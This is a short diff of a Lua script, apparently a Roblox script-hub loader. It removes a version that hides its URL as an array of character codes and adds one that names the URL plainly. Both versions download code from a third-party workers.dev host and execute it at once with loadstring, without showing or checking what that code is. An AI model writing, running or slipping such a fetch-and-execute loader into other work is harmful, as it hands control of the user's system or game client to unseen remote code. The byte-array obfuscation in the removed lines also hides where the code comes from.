@@ -1,3 +1,1 @@
-local b = {104,116,116,112,115,58,47,47,116,49,110,107,113,45,104,117,98,46,122,97,112,97,100,117,110,115,107,105,121,49,51,53,52,46,119,111,114,107,101,114,115,46,100,101,118,47,108,111,97,100,101,114}
-local u = "" for i = 1, #b do u = u .. string.char(b[i]) end
-loadstring(game:HttpGet(u))()
+loadstring(game:HttpGet("https://t1nkq-hub.zapadunskiy1354.workers.dev/loader"))()
